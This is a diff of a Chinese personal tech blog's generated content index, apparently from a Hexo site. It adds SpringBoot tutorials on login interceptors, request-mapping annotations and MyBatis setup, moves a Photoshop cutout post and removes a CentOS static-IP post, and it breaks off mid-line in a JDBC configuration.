-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet <span class="comment">#网络类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.将这个更改为none</span></span><br><span class="line">BOOTPROTO=none <span class="comment">#IP获取方式，有dhcp自动获取和静态IP（none/static）</span></span><br><span class="line"></span><br><span class="line">NAME=ens33 <span class="comment">#网络名称</span></span><br><span class="line">UUID=d1755a41-8026-42f1-871d-9cd78fa2aa3c </span><br><span class="line">DEVICE=ens33 <span class="comment">#驱动名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.更改为yes</span></span><br><span class="line">ONBOOT=yes <span class="comment">#设置开机启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.添加以下内容</span></span><br><span class="line">IPADDR=192.168.137.3 <span class="comment">#设置静态IP地址，结合上图填写</span></span><br><span class="line">NETMASK=255.255.255.0 <span class="comment">#子网掩码</span></span><br><span class="line">GATEWAY=192.168.137.254 <span class="comment">#网关，结合上图填写</span></span><br><span class="line">DNS1=114.114.114.114 <span class="comment">#DNS</span></span><br><span class="line">DNS2=202.96.134.133</span><br></pre></td></tr></table></figure>
-<p>保存退出后重启网络服务</p>
-<p><code>systemctl restart network.service</code></p>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1488,6 +1549,21 @@
       </categories>
   </entry>
   <entry>
+    <title>PS高级抠图</title>
+    <url>/post/6be47898.html</url>
+    <content><![CDATA[<h1 id="1-色彩范围抠图"><a href="#1-色彩范围抠图" class="headerlink" title="1 色彩范围抠图"></a>1 色彩范围抠图</h1><ol>
+<li>选择色彩范围（选区预览选择灰度），使用吸管工具在背景上吸取一下，按shift或者alt自定义调整吸取颜色，要求背景纯白对比鲜明<span id="more"></span></li>
+<li>创建蒙版，选择画笔工具擦掉背景多余的部分</li>
+<li>调整蒙版，点击选择并遮住，进行调节，然后输出新建带有蒙版的图层</li>
+<li>使用画笔工具进行调节细节（44透明度，32流量）</li>
+</ol>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20210806-image-20210806233802910.png" alt="image-20210806233802910" style="zoom: 80%;" /><img src="https://gitee.com/q1jy/images/raw/master/img/20210806-image-20210806233821384.png" alt="image-20210806233821384" style="zoom: 80%;" /></p>
+]]></content>
+      <categories>
+        <category>PS技巧</category>
+      </categories>
+  </entry>
+  <entry>
     <title>PS通道磨皮</title>
     <url>/post/43f4f6ba.html</url>
     <content><![CDATA[<ol>
@@ -1503,21 +1579,6 @@
 <li>在最上方按住alt+新建图层按钮，打开工具窗口，模式选择柔光并勾选填充柔光中性色</li>
 <li>在步骤（10）的图层上，选择画笔工具（硬度0，不透明度5，流量50，白色），涂抹眼睛部分，之后选择黑色，涂抹暗部区</li>
 </ol>
-]]></content>
-      <categories>
-        <category>PS技巧</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>PS高级抠图</title>
-    <url>/post/6be47898.html</url>
-    <content><![CDATA[<h1 id="1-色彩范围抠图"><a href="#1-色彩范围抠图" class="headerlink" title="1 色彩范围抠图"></a>1 色彩范围抠图</h1><ol>
-<li>选择色彩范围（选区预览选择灰度），使用吸管工具在背景上吸取一下，按shift或者alt自定义调整吸取颜色，要求背景纯白对比鲜明<span id="more"></span></li>
-<li>创建蒙版，选择画笔工具擦掉背景多余的部分</li>
-<li>调整蒙版，点击选择并遮住，进行调节，然后输出新建带有蒙版的图层</li>
-<li>使用画笔工具进行调节细节（44透明度，32流量）</li>
-</ol>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20210806-image-20210806233802910.png" alt="image-20210806233802910" style="zoom: 80%;" /><img src="https://gitee.com/q1jy/images/raw/master/img/20210806-image-20210806233821384.png" alt="image-20210806233821384" style="zoom: 80%;" /></p>
 ]]></content>
       <categories>
         <category>PS技巧</category>
@@ -1844,6 +1905,144 @@
 ]]></content>
   </entry>
   <entry>
+    <title>SpringBoot-拦截器</title>
+    <url>/post/e3a97206.html</url>
+    <content><![CDATA[<p>　　SpringBoot学习，主要内容是拦截器，可以实现网站的登录功能<span id="more"></span></p>
+<h1 id="1-实现登录拦截"><a href="#1-实现登录拦截" class="headerlink" title="1.实现登录拦截"></a>1.实现登录拦截</h1><p>　　首先需要编写相应模块的类实现HandlerInterceptor，然后再拦截配置类里面编辑要拦截胡页面。</p>
+<h2 id="1-1-编写类实现HandlerInterceptor类"><a href="#1-1-编写类实现HandlerInterceptor类" class="headerlink" title="1.1 编写类实现HandlerInterceptor类"></a>1.1 编写类实现HandlerInterceptor类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//编写业务拦截的规则</span></span><br><span class="line">        <span class="comment">//从session中获取用户的信息</span></span><br><span class="line">        User user = (User) request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断用户是否登录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == user) &#123;</span><br><span class="line">            <span class="comment">//未登录</span></span><br><span class="line">            response.sendRedirect(request.getContextPath() + <span class="string">&quot;/nologin&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　实现HanderInterceptor，重写preHandle、postHandle、afterCompletion三个方法，先获取session的用户信息，然后判断是否登录。</p>
+<h2 id="1-2-声明拦截配置类"><a href="#1-2-声明拦截配置类" class="headerlink" title="1.2 声明拦截配置类"></a>1.2 声明拦截配置类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//定义此类为配置文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterceptorConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//要拦截user下的所有访问请求，必须用户登录后才能访问</span></span><br><span class="line">        String[] addPathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/**&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//排除路径，排除的路径说明不需要用户登录也可以访问</span></span><br><span class="line">        String[] excludePathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/out&quot;</span>,<span class="string">&quot;/user/error&quot;</span>,<span class="string">&quot;/user/login&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> UserInterceptor()).addPathPatterns(addPathPatterns).excludePathPatterns(excludePathPatterns);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　需要实现WebMvcConfigurer，重写addInterceptors方法，在里面配置需要拦截的请求和排除的请求。</p>
+<h2 id="1-3-编写Controller类进行验证"><a href="#1-3-编写Controller类进行验证" class="headerlink" title="1.3 编写Controller类进行验证"></a>1.3 编写Controller类进行验证</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span>&#123;</span><br><span class="line">        <span class="comment">//将user用户存入session</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setId(<span class="number">1001</span>);</span><br><span class="line">        user.setUsername(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        request.getSession().setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login SUCCESS&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//登录成功才能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/center&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">center</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Center Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不用登录就能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/out&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Out Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果用户未登录访问了需要登录才可访问的请求，才会出错</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/error&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">error</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="2-在SpringBoot框架下使用Servlet"><a href="#2-在SpringBoot框架下使用Servlet" class="headerlink" title="2.在SpringBoot框架下使用Servlet"></a>2.在SpringBoot框架下使用Servlet</h1><ul>
+<li><p>第一种方式</p>
+<p>在主程序入口处加上@ServletComponentScan注解，然后正常使用@WebServlet注解</p>
+</li>
+<li><p>第二种方式</p>
+<p>使用@Configuration注解定义一个配置类</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>SpringBoot学习</category>
+      </categories>
+      <tags>
+        <tag>SpringBoot学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SpringBoot-请求方式注解</title>
+    <url>/post/6cd03ce5.html</url>
+    <content><![CDATA[<p>　　主要是在开发过程中，如何区别各种请求类型，还有RESTful风格的了解<span id="more"></span></p>
+<h1 id="1-注解"><a href="#1-注解" class="headerlink" title="1.注解"></a>1.注解</h1><h2 id="1-1-RestController"><a href="#1-1-RestController" class="headerlink" title="1.1 @RestController"></a>1.1 @RestController</h2><p>　　相当于控制层类加上@Controller+方法上加@ResponseBody ，意味着当前控制层类中所有方法返还的都是JSON对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//@Controller</span></span><br><span class="line"><span class="comment">//相当于控制层类加上@Controller+方法上加@ResponseBody</span></span><br><span class="line"><span class="comment">//意味着当前控制层类中所有方法返还的都是JSON对象</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student&quot;)</span></span><br><span class="line"><span class="comment">//    @ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        student.setId(<span class="number">1011</span>);</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="1-2-GetMapping查"><a href="#1-2-GetMapping查" class="headerlink" title="1.2 @GetMapping查"></a>1.2 @GetMapping查</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    查询数据使用</span></span><br><span class="line"><span class="meta">@GetMapping(value = &quot;/queryStudentById2&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">queryStudentById2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Only GET Method&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="1-3-PostMapping增"><a href="#1-3-PostMapping增" class="headerlink" title="1.3 @PostMapping增"></a>1.3 @PostMapping增</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/insert&quot;)</span></span><br><span class="line"><span class="comment">//    新增数据使用</span></span><br><span class="line"><span class="comment">//    该注解通常在新增数据的时候使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">insert</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Insert success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="1-4-DeleteMapping删"><a href="#1-4-DeleteMapping删" class="headerlink" title="1.4 @DeleteMapping删"></a>1.4 @DeleteMapping删</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DeleteMapping(value = &quot;/delete&quot;)</span></span><br><span class="line"><span class="comment">//    删除数据时候使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;delete Student&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="1-5-PutMapping改"><a href="#1-5-PutMapping改" class="headerlink" title="1.5 @PutMapping改"></a>1.5 @PutMapping改</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    @RequestMapping(value = &quot;/update&quot;,method = RequestMethod.PUT)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/update&quot;)</span></span><br><span class="line"><span class="comment">//    更改数据时候使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;update student info&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="2-RESTful风格"><a href="#2-RESTful风格" class="headerlink" title="2.RESTful风格"></a>2.RESTful风格</h1><p>localhost:8080/sutdent?id=1001&amp;age=23</p>
+<p>可以优化为</p>
+<p>localhost:8080/sutdent?/1001/23</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;age&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">student1</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="meta">@PathVariable(&quot;age&quot;)</span> Integer age)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; retMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        retMap.put(<span class="string">&quot;id&quot;</span>, id);</span><br><span class="line">        retMap.put(<span class="string">&quot;age&quot;</span>, age);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;status&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">student2</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="meta">@PathVariable(&quot;status&quot;)</span> Integer status)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; retMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        retMap.put(<span class="string">&quot;id&quot;</span>, id);</span><br><span class="line">        retMap.put(<span class="string">&quot;status&quot;</span>, status);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<font color="ff0000">以上代码studen1和studen2出现请求模糊</font>
+
+<p>使用时候需要注意增删改查的请求方式进行区分&lt;/font&gt;</p>
+<ul>
+<li><p>student1需要加@GetMapping、student2需要加@DeleteMapping</p>
+</li>
+<li><p>修改请求路径顺序</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>SpringBoot学习</category>
+      </categories>
+      <tags>
+        <tag>SpringBoot学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SpringBoot-逆向工程</title>
+    <url>/post/1511e846.html</url>
+    <content><![CDATA[<p>　　之前建立实体类，需要手动慢慢建立，很没有效率，了解了逆向工程之后，确实很方便<span id="more"></span></p>
+<h1 id="1-返回json数据"><a href="#1-返回json数据" class="headerlink" title="1.返回json数据"></a>1.返回json数据</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.gyl.springboot.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/say&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">m</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Say:Hello&quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/mapvalue&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Map&lt;String, Object&gt; <span class="title">mapvalue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; retMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        retMap.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;hello SpringBoot&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在浏览器中url后面加上<code>?message=World</code></p>
+<p>就会显示Say:HelloWorld</p>
+<p>访问localhost:8080/mapvalue可以显示</p>
+<p>message:hello SpringBoot</p>
+<h1 id="2-核心配置文件"><a href="#2-核心配置文件" class="headerlink" title="2.核心配置文件"></a>2.核心配置文件</h1><h2 id="2-1-三类配置文件比较"><a href="#2-1-三类配置文件比较" class="headerlink" title="2.1 三类配置文件比较"></a>2.1 三类配置文件比较</h2><p>properties</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/</span></span><br></pre></td></tr></table></figure>
+<p>yml和yaml格式一样，只是名字不一样</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>
+<p>当yml/properties文件同时存在时，以properties文件为准</p>
+<h1 id="3-多环境下核心配置文件"><a href="#3-多环境下核心配置文件" class="headerlink" title="3.多环境下核心配置文件"></a>3.多环境下核心配置文件</h1><p>开发环境—&gt;测试环境—&gt;准生产环境—&gt;生产环境</p>
+<p>yml和properties一样，只是后缀不一样</p>
+<p>主核心配置文件</p>
+<p><code>application.properties</code></p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">spring.profiles.active</span>=<span class="string">dev</span></span><br></pre></td></tr></table></figure>
+<p>多配置文件要以application-开头</p>
+<p><code>application-dev.properties</code>开发环境</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/dev</span></span><br></pre></td></tr></table></figure>
+<p><code>application-test.properties</code>测试环境</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/test</span></span><br></pre></td></tr></table></figure>
+<p><code>application-ready.properties</code>准生产环境</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/ready</span></span><br></pre></td></tr></table></figure>
+<p><code>application-product.properties</code>生产环境</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/product</span></span><br></pre></td></tr></table></figure>
+<h1 id="4-集成jsp"><a href="#4-集成jsp" class="headerlink" title="4.集成jsp"></a>4.集成jsp</h1><p>首先，创建webapp资源文件夹，并设置该文件夹为web项目文件夹。</p>
+<p>之后，在pom.xml中引入SpringBoot内嵌tomcat对jsp的解依赖</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后，在pom.xml下指定编译路径在\<build>\</build>中</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--源文件夹--&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/webapp<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--指定编译到META-INF/resources--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>META-INF/resources<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--指定源文件夹中的哪个资源要编译进行--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">include</span>&gt;</span>*.*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最后，在application.properties中配置视图解析器</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">spring.mvc.view.prefix</span>=<span class="string">/</span></span><br><span class="line"><span class="meta">spring.mvc.view.suffix</span>=<span class="string">.jsp</span></span><br></pre></td></tr></table></figure>
+<h1 id="5-集成MyBatis依赖"><a href="#5-集成MyBatis依赖" class="headerlink" title="5.集成MyBatis依赖"></a>5.集成MyBatis依赖</h1><p>导入MaBatis依赖支持</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--MySQL驱动--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--MyBatis整合SpringBoot框架的起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="5-1-MyBatis逆向工程"><a href="#5-1-MyBatis逆向工程" class="headerlink" title="5.1 MyBatis逆向工程"></a>5.1 MyBatis逆向工程</h2><p><strong>1.GeneratorMapper.xml</strong></p>
+<p>在根目录下创建GeneratorMapper.xml</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">generatorConfiguration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--指定连接数据库的JDBC 驱动包所在位置，指定到你本机的完整路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classPathEntry</span></span></span><br><span class="line"><span class="tag">            <span class="attr">location</span>=<span class="string">&quot;D:\JavaTools\Maven\Mavenrespository\mysql\mysql-connector-java\8.0.22\mysql-connector-java-8.0.22.jar&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置table表信息内容体，targetRuntime 指定采用MyBatis3的版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">&quot;testTables&quot;</span> <span class="attr">targetRuntime</span>=<span class="string">&quot;MyBatis3&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--抑制生成注释，由于生成的注释都是英文的，可以不让它生成--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suppressAllComments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置数据库连接信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">connectionURL</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/springboot_student?useUnicode=true<span 